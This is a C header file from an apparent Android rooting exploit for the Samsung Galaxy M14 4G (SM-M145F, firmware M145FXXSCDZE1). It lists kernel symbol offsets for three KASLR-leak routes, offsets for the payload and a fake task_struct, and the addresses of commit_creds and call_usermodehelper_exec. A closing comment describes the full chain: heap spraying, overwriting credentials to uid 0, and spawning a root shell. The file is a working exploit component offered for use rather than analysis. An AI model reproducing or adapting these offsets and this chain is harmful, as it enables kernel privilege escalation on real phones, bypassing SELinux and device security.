/* ============================================================================
 * ROOT MY GALAXY - FINAL TARGET CONFIGURATION
 * Device: Samsung Galaxy M14 4G (SM-M145F)
 * Model: M145FXXSCDZE1
 * Kernel: 5.15.180-android13-8-31192385-abM145FXXSCDZE1
 * Platform: Snapdragon (NOT Exynos)
 * Extraction Date: 2026-09-12
 * ============================================================================ */

#ifndef __TARGET_H__
#define __TARGET_H__

/* ============================================================================
 * DEVICE IDENTIFICATION
 * ============================================================================ */

#define TARGET_DEVICE               "SM-M145F"
#define TARGET_MODEL                "M145FXXSCDZE1"
#define TARGET_PLATFORM             "snapdragon"
#define TARGET_KERNEL_RELEASE       "5.15.180-android13-8-31192385-abM145FXXSCDZE1"

/* ============================================================================
 * MEMORY CONFIGURATION
 * ============================================================================ */

#define KERNEL_BASE                 0xffffffc000000000ULL
#define KERNEL_PHYS_OFFSET          0x80000000ULL
#define KERNEL_PHYS_LOAD            0x80000000ULL
#define PAGE_OFFSET                 0xffffff8000000000UL
#define DIRECT_MAP_BASE             0xffffff8000000000UL
#define VMEMMAP_START               0xfffffe0000000000UL
#define STRUCT_PAGE_SIZE            0x40UL

/* ============================================================================
 * KASLR REFERENCE SYMBOLS
 * ============================================================================ */

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE            0x0ab81d50UL
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE          0x0ab81d50UL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE 0x0af4c3a1UL
#define SLIDE_INIT_TASK_IMAGE                     0x0acc5e80UL
#define SLIDE_ROOT_TASK_GROUP_IMAGE               0x0addbac0UL
#define SLIDE_SYSCTL_BOOTID_IMAGE                 0x0af4c3a1UL
#define SLIDE_SELINUX_ENFORCING_BOOT_IMAGE        0x0ab37404UL

/* ============================================================================
 * EXPLOIT ROUTE 1: TRACEFS (PRIMARY KASLR LEAK)
 * ============================================================================ */

#define SLIDE_TRACEFS_EVENT_ID                    108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x08308c30UL
#define APP_SLIDE_RECLAIM_SENDS                   16

/* Tracefs helper functions */
#define TRACEFS_CREATE_FILE                       0x08816b2cUL
#define TRACEFS_CREATE_DIR                        0x08816e70UL
#define TRACEFS_REMOVE                            0x088173bcUL
#define TRACE_EVENT_BUFFER_COMMIT                 0x08307290UL

/* ============================================================================
 * EXPLOIT ROUTE 2: PSELECT (FALLBACK KASLR LEAK)
 * ============================================================================ */

#define SLIDE_PSELECT_SYSCALL_ADDR                0x08583390UL
#define SLIDE_PSELECT_SYSCALL_TABLE               0x09fb40b8UL
#define SLIDE_PSELECT_DO_FUTEX                    0x082947d8UL
#define SLIDE_PSELECT_PER_CPU_START               0x0ab4c000UL
#define SLIDE_PSELECT_WORD_SHIFT                  0
#define SLIDE_PSELECT_NFDS                        320
#define SLIDE_COMPAT_SYSCALL_TABLE                0x09fb4f18UL

/* ============================================================================
 * EXPLOIT ROUTE 3: ASHMEM/FILE OPS (SECONDARY FALLBACK)
 * ============================================================================ */

#define ASHMEM_IOCTL                              0x0918e290UL
#define COMPAT_ASHMEM_IOCTL                       0x0918e940UL
#define ASHMEM_FOPS                               0x0a16b0f8UL
#define ASHMEM_MMAP                               0x0918e9a0UL
#define ASHMEM_OPEN                               0x0918ec90UL
#define ASHMEM_RELEASE                            0x0918ed30UL

/* File operations */
#define GENERIC_FILE_SPLICE_READ                  0x085ca2dcUL
#define GENERIC_FILE_LLSEEK                       0x08556998UL
#define GENERIC_FILE_LLSEEK_SIZE                  0x0856a9d0UL

/* ============================================================================
 * PAYLOAD STRUCTURE OFFSETS
 * ============================================================================ */

#define FOPS_OFF          0x000UL
#define LOCK_OFF          0x700UL
#define W0_OFF            0x708UL
#define LEFT_OFF          0x750UL
#define RIGHT_OFF         0x800UL
#define SCRATCH_OFF       0x800UL
#define FAKE_TASK_OFF     0x900UL

/* ============================================================================
 * FAKE TASK STRUCTURE OFFSETS
 * ============================================================================ */

#define FAKE_TASK_USAGE_OFF        0x40UL
#define FAKE_TASK_PRIO_OFF         0x84UL
#define FAKE_TASK_NORMAL_PRIO_OFF  0x8cUL
#define FAKE_TASK_PI_LOCK_OFF      0x924UL
#define FAKE_TASK_PI_WAITERS_OFF   0x938UL
#define FAKE_TASK_PI_TOP_TASK_OFF  0x948UL
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950UL
#define FAKE_TASK_TASK_GROUP_OFF   0x348UL

/* ============================================================================
 * PIPE BUFFER CONFIGURATION
 * ============================================================================ */

#define PIPE_LOCK                                 0x0856aa8cUL
#define PIPE_UNLOCK                               0x0856aa60UL
#define PIPE_BUFFER_SLOTS                         16
#define PIPE_BUF_FLAG_CAN_MERGE                   0x04UL
#define NOOP_LLSEEK                               0x08556884UL

/* ============================================================================
 * MEMORY ALLOCATION
 * ============================================================================ */

#define KMALLOC_CACHES                            0x0a1d5250UL

/* ============================================================================
 * WORKQUEUE & ASYNC EXECUTION
 * ============================================================================ */

#define SYSTEM_UNBOUND_WQ                         0x0ab807d8UL
#define QUEUE_WORK_ON                             0x08172998UL
#define CALL_USERMODEHELPER_EXEC                  0x0816f500UL

/* ============================================================================
 * PRIVILEGE ESCALATION - CREDENTIAL MANAGEMENT
 * ============================================================================ */

#define COMMIT_CREDS                              0x0818b654UL
#define PREPARE_CREDS                             0x0818a888UL
#define OVERRIDE_CREDS                            0x0818ad60UL
#define __PUT_CRED                                0x0818af14UL
#define SET_USER_NICE                             0x081a1e5cUL
#define SET_USER_SIGMASK                          0x081656a0UL

/* ============================================================================
 * SCHEDULING & PROCESS MANAGEMENT
 * ============================================================================ */

#define SET_TASK_IOPRIO                           0x089a5c10UL
#define SET_CPUS_ALLOWED_PTR                      0x081a5a94UL

/* ============================================================================
 * SELINUX & SECURITY CAPABILITIES
 * ============================================================================ */

#define SELINUX_ENFORCING_BOOT                    0x0ab37404UL
#define SECURITY_CAPABLE                          0x088e13fcUL
#define CAP_CAPABLE                               0x088de8e0UL

/* ============================================================================
 * EXPLOIT BUILD CONFIGURATION
 * ============================================================================ */

#define BUILD_LABEL                               "M145FXXSCDZE1"
#define STACK_WRITER                              "pselect"
#define RECLAIM_METHOD                            "legacy"
#define FOPS_METHOD                               "bank"
#define PIPE_METHOD                               "before-fops"

/* ============================================================================
 * EXPLOIT CHAIN FLOW
 * ============================================================================ */

/* 
 * 1. KASLR Leak (one of three methods):
 *    - Try TRACEFS first (0x08308c30 = init_tracer_tracefs)
 *    - Fallback to PSELECT (0x08583390 = __arm64_sys_pselect6)
 *    - Fallback to ASHMEM/FOPS (0x0918e290 = ashmem_ioctl)
 *
 * 2. Memory Shaping:
 *    - Allocate SKB buffer (pipe)
 *    - Spray order-3 pages
 *    - Create slab fragmentation
 *
 * 3. Controlled Memory Write:
 *    - Use ashmem_ioctl or generic_file_splice_read
 *    - Write fake task_struct (0x900 offset)
 *    - Overwrite credentials
 *
 * 4. Privilege Escalation:
 *    - Call commit_creds(0x0818b654)
 *    - Set uid=0, gid=0
 *
 * 5. Root Shell:
 *    - Call call_usermodehelper_exec(0x0816f500)
 *    - Execute /system/bin/sh with uid=0
 */

#endif /* __TARGET_H__ */
